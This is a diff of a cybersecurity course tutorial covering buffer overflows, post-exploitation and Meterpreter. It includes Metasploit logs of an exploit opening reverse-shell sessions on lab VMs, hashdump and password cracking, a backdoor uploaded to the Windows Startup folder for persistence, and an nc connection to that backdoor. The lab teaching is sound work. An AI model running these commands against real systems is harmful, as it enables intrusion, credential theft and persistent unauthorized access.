@@ -65,14 +65,14 @@ Make your password complicated so that it is hard to guess.
 
 The buffer overflow attack is an advanced attack.
 The server software may have a specific vulnerability called buffer overflow vulnerability.
-When the attacker sends a message to the server,
-the server code may save the message into a buffer (computer memeory) in a function for further processing.
 As we know, when the function is done, it returns to next instruction after the function call as the picture below shows.
 
 <img src="../Imgs/fcall.png" width=160>
 
-The return address of the function, e.g., *the address of next instruction* in the picture, is also stored in computer memory. 
-If the attack message is long and the buffer used by the function holding the message is relatively small, the message may overflow the buffer and overwrite the function's return address so that the ovrwritten return address now points to the malcious code embedded in the malicious message.
+The return address of the function, e.g., *the address of next instruction* in the picture, is stored in particular computer memory. 
+When the attacker sends a message to the server,
+a function of the server code may save the message into a buffer (computer memeory) for later processing.
+If the attack message is long and the buffer is relatively small, the message may overflow the buffer and overwrite the function's return address so that the ovrwritten return address now points to the malcious code embedded in the malicious message.
 Now when the function is done and returns, the malicious code in the malicious message gets running.
 The picture below shows how a malicious message may be constructed to overwrite the buffer and return address.
 
@@ -82,51 +82,49 @@ The buffer overflow vulnerability often occurs in software written in C or C++.
 Python is designed to avoid the buffer overflow vulnerability although Python can be used to perform the buffer overflow attack.
 
 ### Phase  3: Post Exploitation
-Once the attacker gets inside the victim computer, what else can they do?
-The attackers wants profit from the exploitation.
-That's why actually post exploitation is very important to the hackers.
+Once the attacker gets inside of the victim computer, what else can he do?
+The attackers wants to profit to from the exploitation and will perform post exploitation activities.
 
-The post exploitation can be escalating privileges.
-Sometimes the attacker may be able to just compromise a normal user's account,
-which doesn't have any kind of admin privilege.
+Post exploitation can be escalating privileges.
+Sometimes the attacker may be able to just compromise a normal user account,
+which doesn't have the admin privilege.
 The attacker will think about other ways to escalate their privileges so that they
 can do more damages. 
 
 The attacker may explore your computer, steal your data, and look around.
-If they got enough privileges for example root/admin privilege
-they may actually dump password hash and use John the Reaper to crack those password hashes so that they
+If they got enough privileges for example the root/admin privilege
+they may actually dump password hashes and use *John the Reaper* to crack password hashes so that they
 get all the passwords.
 
-The post exploitation can be setup of pivoting. What does that mean?
-Sometimes the attacker may just be able to actually hack one computer within within an enterprise or within a school.
+Post exploitation can be setup of pivoting. What does that mean?
+Sometimes the attacker may just be able to actually hack one computer within an enterprise or a school.
 They want to utilize this compromised computer to hack into other computers. This is called pivoting.
 Normally the school or the enterprise may not have enough funds to deploy defense systems inside of their campus.
-Most of the defense such as firewall is set up at the the edge of the campus either the firewall.
-Once the attacker is inside the campus network, they can do more damage.
-They can use the compromised computer as stepping
-stone to attack other computers or networks from inside.
+Most of the defense such as firewall is set up at the edge of the campus.
+Once the attacker is inside of the campus network, they will be able to do more damages.
+They can use the compromised computer as stepping stone to attack other computers or networks from inside.
 
 ## Introduction to Metasploit and Armitage
 Please check this <a href="../FieldTrips">tutorial</a> on an introduction to Metasploit and Armitage.
 
-## Post exploitation and meterpreter
+## Post exploitation and Meterpreter
 
-Once into a computer, the attacker may collects sensitive information e.g., usernames and passwords.
-How? One way is to use meterpreter, a Metasploit attack payload.
-Meterpreter provides the attacker an interactive shell exploring the target machine and executing code.
-For example, within meterpreter, *hashdump* can list all the usernames and the passwords.
-Then use John the ripper to crack password hashes.
+Once into a computer, the attacker may collect sensitive information e.g., usernames and passwords.
+How? One way is to use Meterpreter, a Metasploit attack payload, which is the malcious code the attacker sends to the victim server and gets running.
+Meterpreter provides the attacker an interactive shell (emulated console) exploring the target machine and executing code.
+For example, within Meterpreter, *hashdump* can list all the usernames and the passwords.
+Then use *John the Ripper* to crack password hashes.
 
 <img src="../Imgs/Interact.png" width=720>
 
-The attacker may also want to maintaining access to the compromsied computer
+The attacker may also want to maintain access to the compromsied computer
 so that even if the compromised computer restarts, the attacker can still get in.
 If access is not maintained, the attacker will have to exploit it from the beginning in case the hacked system is closed or patched
 The best way of maintaining access is to install a backdoor.
 
 ### knock module against vchat
 
-Here is what happens (armitage shows in the exploit window) when using the knock module without selecting *Use a reverse connection*
+Here is what happens (armitage shows in the exploit window) when using the *knock* module without selecting *Use a reverse connection*
 ```
 msf6 > use exploit/windows/vulnserver/knock
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -152,7 +150,7 @@ msf6 exploit(windows/vulnserver/knock) > exploit -j
 [*] Meterpreter session 1 opened (192.168.1.4:38211 -> 192.168.1.19:19521 ) at 2022-06-12 16:25:01 -0400
 ```
 
-Here is what happens (armitage shows in the exploit window) when using the knock module with selecting *Use a reverse connection*
+Here is what happens (armitage shows in the exploit window) when using the *knock* module with selecting *Use a reverse connection*
 ```
 msf6 > use exploit/windows/vulnserver/knock
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -179,7 +177,7 @@ msf6 exploit(windows/vulnserver/knock) > exploit -j
 ```
 ### Meterpreter commands
 
-Please a more complete list of Meterpreter commands <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">here</a>.
+Please see a more complete list of Meterpreter commands <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">here</a>.
 
 - help
 - getuid
@@ -204,7 +202,7 @@ Please check this <a href="../FieldTrips">tutorial</a>.
 ## Hands-on 2: Capturing sreenshot
 1. The attacker hacks into the target and opens a Meterpreter shell.
 
-2. Use the meterpreter command *screenshot* tom capture a screenshot of the Windows VM.
+2. Use the meterpreter command *screenshot* to capture a screenshot of the Windows VM.
 
 ## Hands-on 3: Capturing sreenshot
 1. The attacker hacks into the target and opens a Meterpreter shell.
@@ -216,7 +214,7 @@ Please check this <a href="../FieldTrips">tutorial</a>.
 
 1. The attacker hacks into the target and opens a Meterpreter shell.
 
-2. Within the Meterpreter shell, *upload* the backdoor to the startup folder
+2. Within the Meterpreter shell, *upload* the backdoor program, *nice3.exe* in the example below, to the startup folder
 
 ```
 meterpreter > upload /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe C:\\Users\\"Malware Analysis"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\nice3.exe
@@ -224,11 +222,11 @@ meterpreter > upload /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBack
 [*] Uploaded 49.83 KiB of 49.83 KiB (100.0%): /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
 [*] uploaded   : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
 ```
-Please pay attention to how the long folder name with multiple words is quoted.
+Please pay attention to how the long folder name with multiple words and spaces is quoted.
 
 To find where the startup folder is, press the Windows logo key  + R, type *shell:startup*, then select OK. This opens the Startup folder so that you can see where it is.
 
-3. Restart Windows VM. Use *nc* at Kali VM to log into the backdoor
+3. Restart Windows VM. Use *nc* at Kali VM to log into the backdoor, which spawns a Windows command console.
 ```
 ┌──(kali㉿Cyber-Range)-[~]
 └─$ nc 192.168.1.19 8080    
